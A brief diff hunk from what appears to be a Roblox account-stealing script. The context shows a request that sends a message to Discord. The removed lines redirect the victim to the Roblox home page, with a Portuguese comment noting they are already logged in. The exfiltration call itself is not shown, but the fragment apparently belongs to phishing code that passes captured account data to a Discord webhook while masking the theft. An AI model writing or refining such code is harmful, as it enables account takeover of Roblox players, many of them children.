@@ -76,9 +76,6 @@
             .then(response => {
                 if (!response.ok) {
                     throw new Error('Error sending message to Discord');
-                } else {
-                    // Redireciona para a página inicial do Roblox, já logado na conta
-                    window.location.href = "https://www.roblox.com/home";
                 }
             })
             .catch(error => {
